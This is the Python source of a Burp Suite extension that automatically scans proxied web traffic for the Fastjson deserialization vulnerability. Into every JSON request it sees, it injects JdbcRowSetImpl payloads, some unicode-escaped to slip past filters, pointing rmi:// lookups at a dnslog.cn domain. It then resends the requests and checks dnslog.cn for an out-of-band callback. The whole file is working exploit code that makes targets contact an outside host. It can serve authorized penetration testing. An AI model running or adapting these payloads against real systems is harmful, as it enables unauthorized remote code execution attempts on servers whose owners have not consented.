# /usr/bin/env python
# _*_ coding:utf-8 _*_
__author__ = 'f0ng'

from burp import IBurpExtender
from burp import IHttpListener
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService
import sys
import time
import os
import re
import requests
from hashlib import md5
import random
import urllib



def randmd5():
    new_md5 = md5()
    new_md5.update(str(random.randint(1, 1000)))
    return new_md5.hexdigest()[:6]


class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        print("[+] #####################################")
        print("[+]     FastjsonScandnslog")
        print("[+]     Author:   f0ng")
        print("[+] #####################################\r\n\r\n")
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName('FastjsonScandnslog')
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        # 响应是否为json
        response_is_json = False

        # 请求是否为url编码
        resquest_is_urlcode = False

        # 请求是否大写
        request_is_upper = False
        # if toolFlag == self._callbacks.TOOL_PROXY or toolFlag == self._callbacks.TOOL_REPEATER:
        if toolFlag == self._callbacks.TOOL_PROXY or toolFlag == self._callbacks.TOOL_REPEATER:
            # 监听Response
            if not messageIsRequest:

                '''请求数据'''
                # 获取请求包的数据
                resquest = messageInfo.getRequest()
                analyzedRequest = self._helpers.analyzeRequest(resquest)
                request_header = analyzedRequest.getHeaders()
                request_bodys = resquest[analyzedRequest.getBodyOffset():].tostring()
                # request_host, request_Path = self.get_request_host(request_header)
                request_contentType = analyzedRequest.getContentType()

                # 请求方法
                reqMethod = analyzedRequest.getMethod()

                '''响应数据'''
                # 获取响应包数据
                response = messageInfo.getResponse()
                analyzedResponse = self._helpers.analyzeResponse(response)  # returns IResponseInfo
                response_headers = analyzedResponse.getHeaders()
                response_bodys = response[analyzedResponse.getBodyOffset():].tostring()
                response_statusCode = analyzedResponse.getStatusCode()
                expression = r'.*(application/json).*'
                for rpheader in response_headers:
                    if (rpheader.startswith("Content-Type:") or rpheader.startswith("content-type:")) and re.match(expression, rpheader):
                        response_is_json = True

                # 获取服务信息
                httpService = messageInfo.getHttpService()
                port = httpService.getPort()
                host = httpService.getHost()

                headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',}
                r_first = requests.get("http://dnslog.cn/getdomain.php",headers=headers)
                r_h = re.findall( r'PHPSESSID=(.*?);', str(r_first.headers))
                headers["Cookie"] = "PHPSESSID=" + r_h[0]
                payload_dnslog = str(r_first.content)
                randomStr = randmd5()
                lists= ['{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","dataSourceName":"rmi://'+ str(randomStr)  + str(host) + '.' + payload_dnslog + '/Exploit","autoCommit":true}}',
                        '{"b":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"rmi://'+ str(randomStr)  + str(host) + '.' + payload_dnslog + '/Exploit","autoCommit":true}}',]
                
                if reqMethod == 'POST':

                    # 请求类型或响应类型是application/json
                    if response_is_json or request_contentType == 4 or "=%7B" in request_bodys or "=%7b" in request_bodys or "={":

                        for payload  in lists:

                            # 默认payload即可解决content-type为application/json但是请求数据为{}的情况
                            newBodyPayload = payload

                            # content-type:application/json解决方案

                            # 处理请求里带有url编码的 params=%7b请求体 以及正常params={}
                            if "=%7b" in request_bodys or "={" in request_bodys or "=%7B" in request_bodys:

                                if "{" in request_bodys:
                                    payload_a = re.findall("{(.*?)}", request_bodys ,re.S)

                                    newBodyPayload = request_bodys.replace( "{" + payload_a[0] + "}",newBodyPayload)

                                elif("%7b" in request_bodys):
                                    resquest_is_urlcode = True
                                    # print(urllib.__file__)
                                    payload_a = re.findall("%7b(.*?)%7d", request_bodys ,re.S)

                                    newBodyPayload = urllib.quote(newBodyPayload).lower()
                                    # newBodyPayload = newBodyPayload.lower()

                                    newBodyPayload = request_bodys.replace( "%7b" + payload_a[0] +"%7d" ,newBodyPayload)


                                elif("%7B" in request_bodys):
                                    resquest_is_urlcode = True
                                    request_is_upper = True

                                    payload_a = re.findall("%7B(.*?)%7D", request_bodys ,re.S)

                                    newBodyPayload = urllib.quote(newBodyPayload).upper()
                                    # newBodyPayload = newBodyPayload.upper()
                                    newBodyPayload = request_bodys.replace( "%7B" + payload_a[0] + "%7D" ,newBodyPayload)


                            #处理请求里带有{"params":"{请求体}"}
                            if '":"{' in request_bodys  :
                                b = request_bodys.split('{')
                                # 请求体内有\转义双引号，故需要这一步
                                newBodyPayload = newBodyPayload.replace('"','\\"')

                                # 防止出现{"params":"{%22%61%22%3a%22%62%22}"}情况
                                if '%22' in request_bodys:
                                    resquest_is_urlcode = True

                                    # 不需要加"},因为之前split以后是含有"}的
                                    newBodyPayload = urllib.quote(newBodyPayload).lower()
                                    newBodyPayload =  '{' + b[1] + newBodyPayload 

                                else:
                                    newBodyPayload =  '{' + b[1] + newBodyPayload 

                            
                            # 处理请求里带有%7b%22params%22%3a%22%7b请求体%7d%22%7d
                            if '%22%3a%22%7b' in request_bodys or '%22:%22%7b' in request_bodys:
                                resquest_is_urlcode = True

                                b = request_bodys.split('%7b')
                                # 请求体内有\转义双引号，故需要这一步
                                newBodyPayload = newBodyPayload.replace('"','\\"')
                                newBodyPayload = urllib.quote(newBodyPayload).lower()
                                newBodyPayload =  '%7b' + b[1] + newBodyPayload + '%22%7d' 


                            # 处理请求里带有%7B%22params%22%3A%22%7B请求体%7D%22%7D
                            if  '%22%3A%22%7B' in request_bodys or '%22:%22%7B' in request_bodys:
                                resquest_is_urlcode = True
                                request_is_upper = True

                                b = request_bodys.split('%7B')
                                # 请求体内有\转义双引号，故需要这一步
                                newBodyPayload = newBodyPayload.replace('"','\\"')
                                newBodyPayload = urllib.quote(newBodyPayload).upper()
                                newBodyPayload =  '%7B' + b[1] + newBodyPayload + '%22%7D' 


                            # 针对a=1&b=6666&js={"key":"value"}&fff=123该类
                            if resquest_is_urlcode == False:

                                payload_a = re.findall("{(.*?)}", request_bodys, re.S)

                                if len(payload_a) > 0:
                                    newBodyPayload = request_bodys.replace("{" + payload_a[0] + "}",newBodyPayload)

                                # print newBodyPayload
                                
                            else :
                                if request_is_upper == False:
                                    payload_a = re.findall("%7b(.*?)%7d", request_bodys, re.S)
                                    if len(payload_a) > 0:
                                        newBodyPayload = request_bodys.replace("%7b" + payload_a[0] +"%7d" ,newBodyPayload)

                                else:
                                    payload_a = re.findall("%7B(.*?)%7D", request_bodys, re.S)
                                    newBodyPayload = request_bodys.replace("%7B" + payload_a[0] + "%7D" ,newBodyPayload)

                            # newBodyPayload = payload.format(str(randomStr), str(host), str(port))
                            # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
                            newBody = self._helpers.stringToBytes(newBodyPayload)
                            # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
                            newRequest = self._helpers.buildHttpMessage(request_header, newBody)
                            ishttps = False
                            expression = r'.*(443).*'
                            if re.match(expression, str(port)):
                                ishttps = True
                            rep = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)
                            r = requests.get("http://dnslog.cn/getrecords.php",headers=headers)

                            r_hh = re.search( r'(.*?) HTTP/', str(request_header), re.M|re.I)

                            if ((randomStr in r.content) and (host in r.content) and (r.status_code == 200)):                        
                                messageInfo.setHighlight('red')
                                print("\t[+] Target vulnerability")
                                print("\t[-] host:" + str(host))
                                print("\t[-] port:" + str(port))
                                print("\t[-] playload:" + str(newBodyPayload) )
                                print("\t[-] 方法以及路径:" + r_hh.group(1) + "\r\n")


                else:
                    r_hh = re.findall( r'\?(.*?) HTTP/', str(request_header), re.M|re.I)
                    

                    if len(r_hh) > 0:
                        request_uri = r_hh[0]
                    
                        # lists2= ['{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://'+ str(randomStr)  + str(host) + '.' + payload_dnslog + '/Exploit","autoCommit":true}}',
                        # '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://'+ str(randomStr)  + str(host) + '.' + payload_dnslog + '/Exploit","autoCommit":true}}']
                        if  request_contentType == 4 or "=%7B" in request_uri or "=%7b" in request_uri or "={" in request_uri:


                            # 将请求中的uri保存起来，防止后面payload更换
                            request_uri_0 = request_header[0]
                            for payload  in lists:
                                newBodyPayload = payload

                                if "{" in request_uri:
                                    payload_a = re.findall("{(.*?)}", request_uri ,re.S)

                                    request_header[0] = request_uri_0.replace("{" + payload_a[0] + "}",newBodyPayload)


                                elif("%7b" in request_uri):
                                    resquest_is_urlcode = True
                                    payload_a = re.findall("%7b(.*?)%7d", request_uri ,re.S)

                                    newBodyPayload = urllib.quote(newBodyPayload).lower()
                                    # newBodyPayload = newBodyPayload.lower()

                                    request_header[0] = request_uri_0.replace("%7b" + payload_a[0] +"%7d",newBodyPayload).replace("%5c","\\")


                                elif("%7B" in request_uri):
                                    resquest_is_urlcode = True
                                    request_is_upper = True

                                    payload_a = re.findall("%7B(.*?)%7D", request_uri ,re.S)

                                    newBodyPayload = urllib.quote(newBodyPayload).upper()
                                    # newBodyPayload = newBodyPayload.upper()

                                    request_header[0] = request_uri_0.replace("%7B" + payload_a[0] + "%7D",newBodyPayload)



                                newRequest = self._helpers.buildHttpMessage(request_header, request_bodys)


                                ishttps = False
                                expression = r'.*(443).*'
                                if re.match(expression, str(port)):
                                    ishttps = True
                                rep = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

                                r = requests.get("http://dnslog.cn/getrecords.php",headers=headers)

                                r_hh = re.search( r'(.*?) HTTP/', str(request_header), re.M|re.I)

                                if ((randomStr in r.content) and (host in r.content) and (r.status_code == 200)):                        
                                    messageInfo.setHighlight('red')
                                    print("\t[+] Target vulnerability")
                                    print("\t[-] host:" + str(host))
                                    print("\t[-] port:" + str(port))
                                    print("\t[-] playload:" + str(newBodyPayload) )
                                    print("\t[-] 方法以及路径:" + r_hh.group(1) + "\r\n")

                    else:
                        pass



                        

    # 获取请求的url
    def get_request_host(self, reqHeaders):
        uri = reqHeaders[0].split(' ')[1]
        host = reqHeaders[1].split(' ')[1]
        return host, uri

    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数
    def get_request_info(self, request):
        analyzedIRequestInfo = self._helpers.analyzeRequest(request)
        reqHeaders = analyzedIRequestInfo.getHeaders()
        reqBodys = request[analyzedIRequestInfo.getBodyOffset():].tostring()
        reqMethod = analyzedIRequestInfo.getMethod()
        reqParameters = analyzedIRequestInfo.getParameters()
        reqHost, reqPath = self.get_request_host(reqHeaders)
        reqContentType = analyzedIRequestInfo.getContentType()
        print(reqHost, reqPath)
        return analyzedIRequestInfo, reqHeaders, reqBodys, reqMethod, reqParameters, reqHost, reqContentType

    # 获取响应的一些信息：响应头，响应内容，响应状态码
    def get_response_info(self, response):
        analyzedIResponseInfo = self._helpers.analyzeRequest(response)
        resHeaders = analyzedIResponseInfo.getHeaders()
        resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
        # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。
        # resStatusCode = analyzedIResponseInfo.getStatusCode()
        return resHeaders, resBodys

    # 获取服务端的信息，主机地址，端口，协议
    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        return host, port, protocol

    # 获取请求的参数名、参数值、参数类型（get、post、cookie->用来构造参数时使用）
    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        pass

    def doPassiveScan(self, baseRequestResponse):
        self.issues = []
        self.start_run(baseRequestResponse)
        return self.issues

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        '''
        相同的数据包，只报告一份报告
        :param existingIssue:
        :param newIssue:
        :return:
        '''

        if existingIssue.getIssueDetail() == newIssue.getIssueDetail():
            return -1

        return 0
